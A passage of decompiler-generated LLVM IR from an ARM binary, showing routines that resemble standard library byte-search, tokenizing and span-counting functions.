  uselistorder i1* %cpsr_v.global-to-local, { 1, 5, 43, 7, 44, 8, 6, 42, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 19, 20, 4, 21, 2, 22, 3, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i1* %cpsr_n.global-to-local, { 46, 4, 49, 6, 50, 7, 5, 47, 48, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 3, 22, 1, 23, 2, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14b70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14b04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a38, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb151, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_149c4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_14988, { 1, 0 }
  uselistorder label %dec_label_pc_14974, { 1, 0 }
  uselistorder label %dec_label_pc_14934, { 2, 0, 1 }
  uselistorder label %dec_label_pc_148c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1485c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_147fc, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_147cc, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_14768, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_14728, { 1, 0 }
}

define i32 @function_14b90(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14b90:
  %v1_14b94 = urem i32 %arg1, 256
  %v0_14bb0.pr = load i32, i32* @r2, align 4
  %v2_14bb015 = icmp eq i32 %v0_14bb0.pr, 0
  %v0_14bc4.pre = load i32, i32* @r0, align 4
  br i1 %v2_14bb015, label %dec_label_pc_14bc0, label %dec_label_pc_14bb8

dec_label_pc_14b9c:                               ; preds = %dec_label_pc_14bb8
  %v1_14b9c = inttoptr i32 %v0_14bac to i8*
  %v2_14b9c = load i8, i8* %v1_14b9c, align 1
  %v3_14b9c = zext i8 %v2_14b9c to i32
  %v9_14ba0 = icmp eq i32 %v3_14b9c, %v1_14b94
  br i1 %v9_14ba0, label %dec_label_pc_14c70, label %dec_label_pc_14ba8

dec_label_pc_14ba8:                               ; preds = %dec_label_pc_14b9c
  %v1_14ba8 = add i32 %v0_14ba8, -1
  %v1_14bac = add i32 %v0_14bac, 1
  %v2_14bb0 = icmp eq i32 %v1_14ba8, 0
  br i1 %v2_14bb0, label %dec_label_pc_14bc0, label %dec_label_pc_14bb8

dec_label_pc_14bb8:                               ; preds = %dec_label_pc_14b90, %dec_label_pc_14ba8
  %v0_14ba8 = phi i32 [ %v1_14ba8, %dec_label_pc_14ba8 ], [ %v0_14bb0.pr, %dec_label_pc_14b90 ]
  %v0_14bac = phi i32 [ %v1_14bac, %dec_label_pc_14ba8 ], [ %v0_14bc4.pre, %dec_label_pc_14b90 ]
  %v1_14bb8 = urem i32 %v0_14bac, 4
  %v2_14bb8 = icmp eq i32 %v1_14bb8, 0
  br i1 %v2_14bb8, label %dec_label_pc_14bc0, label %dec_label_pc_14b9c

dec_label_pc_14bc0:                               ; preds = %dec_label_pc_14ba8, %dec_label_pc_14bb8, %dec_label_pc_14b90
  %v0_14c3c22 = phi i32 [ 0, %dec_label_pc_14b90 ], [ 0, %dec_label_pc_14ba8 ], [ %v0_14ba8, %dec_label_pc_14bb8 ]
  %v0_14bc4 = phi i32 [ %v0_14bc4.pre, %dec_label_pc_14b90 ], [ %v1_14bac, %dec_label_pc_14ba8 ], [ %v0_14bac, %dec_label_pc_14bb8 ]
  %v4_14bc0 = mul nuw nsw i32 %v1_14b94, 256
  %v5_14bc0 = or i32 %v4_14bc0, %v1_14b94
  %v4_14bc8 = mul i32 %v5_14bc0, 65536
  %v5_14bc8 = or i32 %v4_14bc8, %v5_14bc0
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_14c3c22, 3
  br i1 %tmp, label %dec_label_pc_14bd0, label %dec_label_pc_14c64.preheader

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14bc0, %dec_label_pc_14c3c.backedge
  %v0_14bec60 = phi i32 [ %v1_14bec, %dec_label_pc_14c3c.backedge ], [ %v0_14c3c22, %dec_label_pc_14bc0 ]
  %v0_14c1059 = phi i32 [ %v4_14bd0, %dec_label_pc_14c3c.backedge ], [ %v0_14bc4, %dec_label_pc_14bc0 ]
  %v1_14bd0 = inttoptr i32 %v0_14c1059 to i32*
  %v2_14bd0 = load i32, i32* %v1_14bd0, align 4
  %v4_14bd0 = add i32 %v0_14c1059, 4
  %v2_14bd4 = xor i32 %v2_14bd0, %v5_14bc8
  %v2_14bd8 = add i32 %v2_14bd4, 2130640639
  %v1_14bdc = sub i32 -1, %v2_14bd4
  %v2_14be0 = xor i32 %v2_14bd8, %v1_14bdc
  %v2_14be4 = and i32 %v2_14be0, -2130640640
  %v2_14be8 = icmp eq i32 %v2_14be4, 0
  %v1_14bec = add i32 %v0_14bec60, -4
  br i1 %v2_14be8, label %dec_label_pc_14c3c.backedge, label %dec_label_pc_14bf4

dec_label_pc_14c3c.backedge:                      ; preds = %dec_label_pc_14bd0, %dec_label_pc_14c2c
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_14bec, 3
  br i1 %tmp73, label %dec_label_pc_14bd0, label %dec_label_pc_14c64.preheader

dec_label_pc_14bf4:                               ; preds = %dec_label_pc_14bd0
  %v2_14bf4 = inttoptr i32 %v0_14c1059 to i8*
  %v3_14bf4 = load i8, i8* %v2_14bf4, align 1
  %v4_14bf4 = zext i8 %v3_14bf4 to i32
  %v9_14bfc = icmp eq i32 %v4_14bf4, %v1_14b94
  %v1_14c00 = add i32 %v0_14c1059, 3
  store i32 %v1_14c00, i32* @ip, align 4
  br i1 %v9_14bfc, label %dec_label_pc_14c70, label %dec_label_pc_14c08

dec_label_pc_14c08:                               ; preds = %dec_label_pc_14bf4
  %v1_14c08 = add i32 %v0_14c1059, 1
  %v2_14c08 = inttoptr i32 %v1_14c08 to i8*
  %v3_14c08 = load i8, i8* %v2_14c08, align 1
  %v4_14c08 = zext i8 %v3_14c08 to i32
  %v9_14c0c = icmp eq i32 %v4_14c08, %v1_14b94
  br i1 %v9_14c0c, label %bb, label %dec_label_pc_14c1c

bb:                                               ; preds = %dec_label_pc_14c08
  br label %dec_label_pc_14c70

dec_label_pc_14c1c:                               ; preds = %dec_label_pc_14c08
  %v1_14c1c = add i32 %v0_14c1059, 2
  %v2_14c1c = inttoptr i32 %v1_14c1c to i8*
  %v3_14c1c = load i8, i8* %v2_14c1c, align 1
  %v4_14c1c = zext i8 %v3_14c1c to i32
  %v9_14c20 = icmp eq i32 %v4_14c1c, %v1_14b94
  br i1 %v9_14c20, label %dec_label_pc_14c70, label %dec_label_pc_14c2c

dec_label_pc_14c2c:                               ; preds = %dec_label_pc_14c1c
  %v2_14c2c = inttoptr i32 %v1_14c00 to i8*
  %v3_14c2c = load i8, i8* %v2_14c2c, align 1
  %v4_14c2c = zext i8 %v3_14c2c to i32
  %v9_14c30 = icmp eq i32 %v4_14c2c, %v1_14b94
  br i1 %v9_14c30, label %bb36, label %dec_label_pc_14c3c.backedge

bb36:                                             ; preds = %dec_label_pc_14c2c
  br label %dec_label_pc_14c70

dec_label_pc_14c64.preheader:                     ; preds = %dec_label_pc_14c3c.backedge, %dec_label_pc_14bc0
  %v0_14c10.lcssa = phi i32 [ %v0_14bc4, %dec_label_pc_14bc0 ], [ %v4_14bd0, %dec_label_pc_14c3c.backedge ]
  %v0_14bec.lcssa = phi i32 [ %v0_14c3c22, %dec_label_pc_14bc0 ], [ %v1_14bec, %dec_label_pc_14c3c.backedge ]
  %v2_14c647 = icmp eq i32 %v0_14bec.lcssa, 0
  br i1 %v2_14c647, label %dec_label_pc_14c6c, label %dec_label_pc_14c54

dec_label_pc_14c54:                               ; preds = %dec_label_pc_14c60, %dec_label_pc_14c64.preheader
  %v0_14c64.in = phi i32 [ %v0_14c64, %dec_label_pc_14c60 ], [ %v0_14bec.lcssa, %dec_label_pc_14c64.preheader ]
  %v0_14c60 = phi i32 [ %v1_14c60, %dec_label_pc_14c60 ], [ %v0_14c10.lcssa, %dec_label_pc_14c64.preheader ]
  %v0_14c64 = add i32 %v0_14c64.in, -1
  %v1_14c54 = inttoptr i32 %v0_14c60 to i8*
  %v2_14c54 = load i8, i8* %v1_14c54, align 1
  %v3_14c54 = zext i8 %v2_14c54 to i32
  %v9_14c58 = icmp eq i32 %v3_14c54, %v1_14b94
  br i1 %v9_14c58, label %dec_label_pc_14c70, label %dec_label_pc_14c60

dec_label_pc_14c60:                               ; preds = %dec_label_pc_14c54
  %v1_14c60 = add i32 %v0_14c60, 1
  %v2_14c64 = icmp eq i32 %v0_14c64, 0
  br i1 %v2_14c64, label %dec_label_pc_14c6c, label %dec_label_pc_14c54

dec_label_pc_14c6c:                               ; preds = %dec_label_pc_14c60, %dec_label_pc_14c64.preheader
  br label %dec_label_pc_14c70

dec_label_pc_14c70:                               ; preds = %dec_label_pc_14b9c, %dec_label_pc_14c1c, %dec_label_pc_14bf4, %dec_label_pc_14c54, %bb36, %bb, %dec_label_pc_14c6c
  %v1_14c74 = phi i32 [ 0, %dec_label_pc_14c6c ], [ %v1_14c08, %bb ], [ %v1_14c00, %bb36 ], [ %v0_14c60, %dec_label_pc_14c54 ], [ %v1_14c1c, %dec_label_pc_14c1c ], [ %v0_14c1059, %dec_label_pc_14bf4 ], [ %v0_14bac, %dec_label_pc_14b9c ]
  ret i32 %v1_14c74

; uselistorder directives
  uselistorder i32 %v1_14bec, { 1, 0, 2 }
  uselistorder i32 %v0_14c1059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_14bc0, { 1, 0 }
  uselistorder i32 %v0_14c3c22, { 1, 2, 0 }
  uselistorder i32 %v0_14bac, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_14bc4.pre, { 1, 0 }
  uselistorder i32 %v1_14b94, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_14c70, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_14c3c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14bd0, { 1, 0 }
  uselistorder label %dec_label_pc_14bc0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bb8, { 1, 0 }
}

define i32 @function_14c80() local_unnamed_addr {
dec_label_pc_14c80:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14c80 = load i32, i32* @r4, align 4
  store i32 %v3_14c80, i32* %stack_var_-16, align 4
  %v0_14c84 = load i32, i32* @r0, align 4
  store i32 %v0_14c84, i32* %r4.global-to-local, align 4
  %v2_14c84 = icmp eq i32 %v0_14c84, 0
  %v1_14c88 = load i32, i32* @r2, align 4
  br i1 %v2_14c84, label %bb, label %dec_label_pc_14c80._crit_edge

bb:                                               ; preds = %dec_label_pc_14c80
  %v2_14c88 = inttoptr i32 %v1_14c88 to i32*
  %v3_14c88 = load i32, i32* %v2_14c88, align 4
  store i32 %v3_14c88, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c80._crit_edge

dec_label_pc_14c80._crit_edge:                    ; preds = %dec_label_pc_14c80, %bb
  %v0_14c8c = phi i32 [ %v3_14c88, %bb ], [ %v0_14c84, %dec_label_pc_14c80 ]
  store i32 %v0_14c8c, i32* @r0, align 4
  store i32 %v1_14c88, i32* %r5.global-to-local, align 4
  %v0_14c94 = load i32, i32* @r1, align 4
  store i32 %v0_14c94, i32* %r6.global-to-local, align 4
  %v1_14c98 = inttoptr i32 %v0_14c8c to i8*
  %v2_14c98 = call i32 @function_14ecc(i8* %v1_14c98)
  %v0_14c9c = load i32, i32* %r4.global-to-local, align 4
  %v2_14c9c = add i32 %v0_14c9c, %v2_14c98
  %v3_14c9c = inttoptr i32 %v2_14c9c to i8*
  %v4_14c9c = load i8, i8* %v3_14c9c, align 1
  %v6_14c9c = zext i8 %v4_14c9c to i32
  store i32 %v6_14c9c, i32* %r3.global-to-local, align 4
  store i32 %v2_14c9c, i32* @r4, align 4
  %v2_14ca4 = icmp eq i8 %v4_14c9c, 0
  br i1 %v2_14ca4, label %bb8, label %dec_label_pc_14cb0

bb8:                                              ; preds = %dec_label_pc_14c80._crit_edge
  %v2_14ca8 = load i32, i32* %r5.global-to-local, align 4
  %v3_14ca8 = inttoptr i32 %v2_14ca8 to i32*
  store i32 %v2_14c9c, i32* %v3_14ca8, align 4
  br label %dec_label_pc_14cec

dec_label_pc_14cb0:                               ; preds = %dec_label_pc_14c80._crit_edge
  %v0_14cb0 = load i32, i32* %r6.global-to-local, align 4
  %v3_14cb8 = call i32 @function_15168(i8* %v3_14c9c, i32 %v0_14cb0)
  %v3_14cbc = icmp eq i32 %v3_14cb8, 0
  br i1 %v3_14cbc, label %dec_label_pc_14cc4, label %dec_label_pc_14cdc

dec_label_pc_14cc4:                               ; preds = %dec_label_pc_14cb0
  %v0_14cc8 = load i32, i32* @r4, align 4
  store i32 %v0_14cc8, i32* @r0, align 4
  %v2_14ccc = call i32 @function_14d3c(i32 %v0_14cc8, i32 0)
  %v0_14cd0 = load i32, i32* @r4, align 4
  store i32 %v0_14cd0, i32* %r3.global-to-local, align 4
  %v1_14cd4 = load i32, i32* %r5.global-to-local, align 4
  %v2_14cd4 = inttoptr i32 %v1_14cd4 to i32*
  store i32 %v2_14ccc, i32* %v2_14cd4, align 4
  br label %dec_label_pc_14cec

dec_label_pc_14cdc:                               ; preds = %dec_label_pc_14cb0
  %v4_14cb8 = inttoptr i32 %v3_14cb8 to i8*
  store i8 0, i8* %v4_14cb8, align 1
  %v7_14ce0 = add i32 %v3_14cb8, 1
  %v1_14ce4 = load i32, i32* %r5.global-to-local, align 4
  %v2_14ce4 = inttoptr i32 %v1_14ce4 to i32*
  store i32 %v7_14ce0, i32* %v2_14ce4, align 4
  %v0_14ce8 = load i32, i32* @r4, align 4
  store i32 %v0_14ce8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14cec

dec_label_pc_14cec:                               ; preds = %bb8, %dec_label_pc_14cc4, %dec_label_pc_14cdc
  %v0_14cec = load i32, i32* %r3.global-to-local, align 4
  %v2_14cf0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14cf0, i32* @r4, align 4
  ret i32 %v0_14cec

; uselistorder directives
  uselistorder i32 %v3_14cb8, { 0, 2, 1 }
  uselistorder i32 %v0_14c8c, { 1, 0 }
  uselistorder i32 %v0_14c84, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_14cec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14c80._crit_edge, { 1, 0 }
}

define i32 @function_14cf8() local_unnamed_addr {
dec_label_pc_14cf8:
  %stack_var_-16 = alloca i32, align 4
  %v3_14cf8 = load i32, i32* @r4, align 4
  store i32 %v3_14cf8, i32* %stack_var_-16, align 4
  %v6_14cf8 = load i32, i32* @r5, align 4
  %v9_14cf8 = load i32, i32* @r6, align 4
  %v0_14cfc = load i32, i32* @r0, align 4
  %v0_14d00 = load i32, i32* @r1, align 4
  store i32 %v0_14d00, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_14d1c8 = inttoptr i32 %v0_14cfc to i8*
  %v2_14d1c9 = load i8, i8* %v1_14d1c8, align 1
  %v2_14d2011 = icmp eq i8 %v2_14d1c9, 0
  store i32 %v0_14d00, i32* @r0, align 4
  %v1_14d2812 = add i32 %v0_14cfc, 1
  store i32 %v1_14d2812, i32* @r4, align 4
  br i1 %v2_14d2011, label %dec_label_pc_14d30, label %dec_label_pc_14d0c

dec_label_pc_14d0c:                               ; preds = %dec_label_pc_14cf8, %dec_label_pc_14d18
  %v3_14d1c14.in = phi i8 [ %v2_14d1c, %dec_label_pc_14d18 ], [ %v2_14d1c9, %dec_label_pc_14cf8 ]
  %v0_14d2413 = phi i32 [ %v0_14d24.pre, %dec_label_pc_14d18 ], [ %v0_14d00, %dec_label_pc_14cf8 ]
  %v3_14d1c14 = zext i8 %v3_14d1c14.in to i32
  %v2_14d0c = call i32 @function_15078(i32 %v0_14d2413, i32 %v3_14d1c14)
  %v2_14d10 = icmp eq i32 %v2_14d0c, 0
  %v0_14d18 = load i32, i32* @r5, align 4
  br i1 %v2_14d10, label %dec_label_pc_14d18, label %dec_label_pc_14d30

dec_label_pc_14d18:                               ; preds = %dec_label_pc_14d0c
  %v1_14d18 = add i32 %v0_14d18, 1
  %v0_14d1c.pre = load i32, i32* @r4, align 4
  %v0_14d24.pre = load i32, i32* @r6, align 4
  store i32 %v1_14d18, i32* @r5, align 4
  %v1_14d1c = inttoptr i32 %v0_14d1c.pre to i8*
  %v2_14d1c = load i8, i8* %v1_14d1c, align 1
  %v2_14d20 = icmp eq i8 %v2_14d1c, 0
  store i32 %v0_14d24.pre, i32* @r0, align 4
  %v1_14d28 = add i32 %v0_14d1c.pre, 1
  store i32 %v1_14d28, i32* @r4, align 4
  br i1 %v2_14d20, label %dec_label_pc_14d30, label %dec_label_pc_14d0c

dec_label_pc_14d30:                               ; preds = %dec_label_pc_14d18, %dec_label_pc_14d0c, %dec_label_pc_14cf8
  %v0_14d30 = phi i32 [ 0, %dec_label_pc_14cf8 ], [ %v0_14d18, %dec_label_pc_14d0c ], [ %v1_14d18, %dec_label_pc_14d18 ]
  %v2_14d34 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14d34, i32* @r4, align 4
  store i32 %v6_14cf8, i32* @r5, align 4
  store i32 %v9_14cf8, i32* @r6, align 4
  ret i32 %v0_14d30

; uselistorder directives
  uselistorder i8 %v2_14d1c, { 1, 0 }
  uselistorder i32 %v0_14d24.pre, { 1, 0 }
  uselistorder i32 %v0_14d1c.pre, { 1, 0 }
  uselistorder label %dec_label_pc_14d0c, { 1, 0 }
}

define i32 @function_14d3c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14d3c:
  %v1_14d40 = urem i32 %arg1, 256
  %v0_14d582 = load i32, i32* @r0, align 4
  %v1_14d583 = urem i32 %v0_14d582, 4
  %v2_14d584 = icmp eq i32 %v1_14d583, 0
  br i1 %v2_14d584, label %dec_label_pc_14d60, label %dec_label_pc_14d48

dec_label_pc_14d48:                               ; preds = %dec_label_pc_14d3c, %dec_label_pc_14d54
  %v0_14d54 = phi i32 [ %v1_14d54, %dec_label_pc_14d54 ], [ %v0_14d582, %dec_label_pc_14d3c ]
  %v1_14d48 = inttoptr i32 %v0_14d54 to i8*
  %v2_14d48 = load i8, i8* %v1_14d48, align 1
  %v3_14d48 = zext i8 %v2_14d48 to i32
  %v9_14d4c = icmp eq i32 %v3_14d48, %v1_14d40
  br i1 %v9_14d4c, label %dec_label_pc_14ddc, label %dec_label_pc_14d54

dec_label_pc_14d54:                               ; preds = %dec_label_pc_14d48
  %v1_14d54 = add i32 %v0_14d54, 1
  %v1_14d58 = urem i32 %v1_14d54, 4
  %v2_14d58 = icmp eq i32 %v1_14d58, 0
  br i1 %v2_14d58, label %dec_label_pc_14d60, label %dec_label_pc_14d48

dec_label_pc_14d60:                               ; preds = %dec_label_pc_14d54, %dec_label_pc_14d3c
  %v0_14d64 = phi i32 [ %v0_14d582, %dec_label_pc_14d3c ], [ %v1_14d54, %dec_label_pc_14d54 ]
  %v4_14d60 = mul nuw nsw i32 %v1_14d40, 256
  %v5_14d60 = or i32 %v4_14d60, %v1_14d40
  %v4_14d68 = mul i32 %v5_14d60, 65536
  %v5_14d68 = or i32 %v4_14d68, %v5_14d60
  br label %dec_label_pc_14d6c

dec_label_pc_14d6c:                               ; preds = %dec_label_pc_14dcc, %dec_label_pc_14d6c, %dec_label_pc_14d60
  %v0_14db0 = phi i32 [ %v0_14d64, %dec_label_pc_14d60 ], [ %v4_14d6c, %dec_label_pc_14d6c ], [ %v4_14d6c, %dec_label_pc_14dcc ]
  %v1_14d6c = inttoptr i32 %v0_14db0 to i32*
  %v2_14d6c = load i32, i32* %v1_14d6c, align 4
  %v4_14d6c = add i32 %v0_14db0, 4
  %v2_14d74 = xor i32 %v2_14d6c, %v5_14d68
  %v2_14d78 = add i32 %v2_14d74, 2130640639
  %v1_14d80 = sub i32 -1, %v2_14d74
  %v2_14d84 = xor i32 %v2_14d78, %v1_14d80
  %v2_14d88 = and i32 %v2_14d84, -2130640640
  %v2_14d8c = icmp eq i32 %v2_14d88, 0
  br i1 %v2_14d8c, label %dec_label_pc_14d6c, label %dec_label_pc_14d94

dec_label_pc_14d94:                               ; preds = %dec_label_pc_14d6c
  %v2_14d94 = inttoptr i32 %v0_14db0 to i8*
  %v3_14d94 = load i8, i8* %v2_14d94, align 1
  %v4_14d94 = zext i8 %v3_14d94 to i32
  %v9_14d9c = icmp eq i32 %v4_14d94, %v1_14d40
  %v1_14da0 = add i32 %v0_14db0, 3
  br i1 %v9_14d9c, label %dec_label_pc_14ddc, label %dec_label_pc_14da8

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14d94
  %v1_14da8 = add i32 %v0_14db0, 1
  %v2_14da8 = inttoptr i32 %v1_14da8 to i8*
  %v3_14da8 = load i8, i8* %v2_14da8, align 1
  %v4_14da8 = zext i8 %v3_14da8 to i32
  %v9_14dac = icmp eq i32 %v4_14da8, %v1_14d40
  br i1 %v9_14dac, label %bb, label %dec_label_pc_14dbc

bb:                                               ; preds = %dec_label_pc_14da8
  br label %dec_label_pc_14ddc

dec_label_pc_14dbc:                               ; preds = %dec_label_pc_14da8
  %v1_14dbc = add i32 %v0_14db0, 2
  %v2_14dbc = inttoptr i32 %v1_14dbc to i8*
  %v3_14dbc = load i8, i8* %v2_14dbc, align 1
  %v4_14dbc = zext i8 %v3_14dbc to i32
  %v9_14dc0 = icmp eq i32 %v4_14dbc, %v1_14d40
  br i1 %v9_14dc0, label %dec_label_pc_14ddc, label %dec_label_pc_14dcc

dec_label_pc_14dcc:                               ; preds = %dec_label_pc_14dbc
  %v2_14dcc = inttoptr i32 %v1_14da0 to i8*
  %v3_14dcc = load i8, i8* %v2_14dcc, align 1
  %v4_14dcc = zext i8 %v3_14dcc to i32
  %v9_14dd0 = icmp eq i32 %v4_14dcc, %v1_14d40
  br i1 %v9_14dd0, label %dec_label_pc_14dd8, label %dec_label_pc_14d6c

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14dcc
  br label %dec_label_pc_14ddc

dec_label_pc_14ddc:                               ; preds = %dec_label_pc_14d48, %dec_label_pc_14dbc, %dec_label_pc_14d94, %bb, %dec_label_pc_14dd8
  %v1_14de0 = phi i32 [ %v1_14da0, %dec_label_pc_14dd8 ], [ %v1_14da8, %bb ], [ %v1_14dbc, %dec_label_pc_14dbc ], [ %v0_14db0, %dec_label_pc_14d94 ], [ %v0_14d54, %dec_label_pc_14d48 ]
  ret i32 %v1_14de0

; uselistorder directives
  uselistorder i32 %v4_14d6c, { 1, 0 }
  uselistorder i32 %v0_14db0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_14d60, { 1, 0 }
  uselistorder i32 %v1_14d54, { 1, 0, 2 }
  uselistorder i32 %v0_14d582, { 2, 1, 0 }
  uselistorder i32 %v1_14d40, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_14ddc, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_14d48, { 1, 0 }
}

define i32 @function_14dec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14dec:
  %v1_14df0 = urem i32 %arg2, 256
  %v2_14df4 = add i32 %arg3, %arg1
  %v2_14e0c4 = icmp eq i32 %arg3, 0
  br i1 %v2_14e0c4, label %dec_label_pc_14e1c, label %dec_label_pc_14e14

dec_label_pc_14dfc:                               ; preds = %dec_label_pc_14e14
  %v1_14dfc = add i32 %v0_14dfc, -1
  %v2_14dfc = inttoptr i32 %v1_14dfc to i8*
  %v3_14dfc = load i8, i8* %v2_14dfc, align 1
  %v4_14dfc = zext i8 %v3_14dfc to i32
  %v9_14e00 = icmp eq i32 %v4_14dfc, %v1_14df0
  br i1 %v9_14e00, label %dec_label_pc_14ebc, label %dec_label_pc_14e08

dec_label_pc_14e08:                               ; preds = %dec_label_pc_14dfc
  %v1_14e08 = add i32 %v0_14e08, -1
  %v2_14e0c = icmp eq i32 %v1_14e08, 0
  br i1 %v2_14e0c, label %dec_label_pc_14e1c, label %dec_label_pc_14e14

dec_label_pc_14e14:                               ; preds = %dec_label_pc_14dec, %dec_label_pc_14e08
  %v0_14e08 = phi i32 [ %v1_14e08, %dec_label_pc_14e08 ], [ %arg3, %dec_label_pc_14dec ]
  %v0_14dfc = phi i32 [ %v1_14dfc, %dec_label_pc_14e08 ], [ %v2_14df4, %dec_label_pc_14dec ]
  %v1_14e14 = urem i32 %v0_14dfc, 4
  %v2_14e14 = icmp eq i32 %v1_14e14, 0
  br i1 %v2_14e14, label %dec_label_pc_14e1c, label %dec_label_pc_14dfc

dec_label_pc_14e1c:                               ; preds = %dec_label_pc_14e08, %dec_label_pc_14e14, %dec_label_pc_14dec
  %v0_14ea413 = phi i32 [ %v2_14df4, %dec_label_pc_14dec ], [ %v1_14dfc, %dec_label_pc_14e08 ], [ %v0_14dfc, %dec_label_pc_14e14 ]
  %v0_14e909 = phi i32 [ 0, %dec_label_pc_14dec ], [ 0, %dec_label_pc_14e08 ], [ %v0_14e08, %dec_label_pc_14e14 ]
  %v4_14e1c = mul nuw nsw i32 %v1_14df0, 256
  %v5_14e1c = or i32 %v4_14e1c, %v1_14df0
  %v4_14e20 = mul i32 %v5_14e1c, 65536
  %v5_14e20 = or i32 %v4_14e20, %v5_14e1c
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_14e909, 3
  br i1 %tmp, label %dec_label_pc_14e28, label %dec_label_pc_14eb0

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14e1c, %dec_label_pc_14e90.backedge
  %v0_14e4440 = phi i32 [ %v1_14e44, %dec_label_pc_14e90.backedge ], [ %v0_14e909, %dec_label_pc_14e1c ]
  %v0_14e2839 = phi i32 [ %v1_14e28, %dec_label_pc_14e90.backedge ], [ %v0_14ea413, %dec_label_pc_14e1c ]
  %v1_14e28 = add i32 %v0_14e2839, -4
  %v2_14e28 = inttoptr i32 %v1_14e28 to i32*
  %v3_14e28 = load i32, i32* %v2_14e28, align 4
  %v2_14e2c = xor i32 %v3_14e28, %v5_14e20
  %v2_14e30 = add i32 %v2_14e2c, 2130640639
  store i32 %v2_14e30, i32* @ip, align 4
  %v1_14e34 = sub i32 -1, %v2_14e2c
  %v2_14e38 = xor i32 %v2_14e30, %v1_14e34
  %v2_14e3c = and i32 %v2_14e38, -2130640640
  %v2_14e40 = icmp eq i32 %v2_14e3c, 0
  %v1_14e44 = add i32 %v0_14e4440, -4
  br i1 %v2_14e40, label %dec_label_pc_14e90.backedge, label %dec_label_pc_14e4c

dec_label_pc_14e90.backedge:                      ; preds = %dec_label_pc_14e28, %dec_label_pc_14e84
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_14e44, 3
  br i1 %tmp46, label %dec_label_pc_14e28, label %dec_label_pc_14eb0

dec_label_pc_14e4c:                               ; preds = %dec_label_pc_14e28
  %v1_14e4c = add i32 %v0_14e2839, -1
  %v2_14e4c = inttoptr i32 %v1_14e4c to i8*
  %v3_14e4c = load i8, i8* %v2_14e4c, align 1
  %v4_14e4c = zext i8 %v3_14e4c to i32
  %v9_14e50 = icmp eq i32 %v4_14e4c, %v1_14df0
  br i1 %v9_14e50, label %dec_label_pc_14e7c, label %dec_label_pc_14e5c

dec_label_pc_14e5c:                               ; preds = %dec_label_pc_14e4c
  %v1_14e5c = add i32 %v0_14e2839, -2
  %v2_14e5c = inttoptr i32 %v1_14e5c to i8*
  %v3_14e5c = load i8, i8* %v2_14e5c, align 1
  %v4_14e5c = zext i8 %v3_14e5c to i32
  %v9_14e60 = icmp eq i32 %v4_14e5c, %v1_14df0
  br i1 %v9_14e60, label %dec_label_pc_14e7c, label %dec_label_pc_14e6c

dec_label_pc_14e6c:                               ; preds = %dec_label_pc_14e5c
  %v1_14e6c = add i32 %v0_14e2839, -3
  %v2_14e6c = inttoptr i32 %v1_14e6c to i8*
  %v3_14e6c = load i8, i8* %v2_14e6c, align 1
  %v4_14e6c = zext i8 %v3_14e6c to i32
  %v9_14e70 = icmp eq i32 %v4_14e6c, %v1_14df0
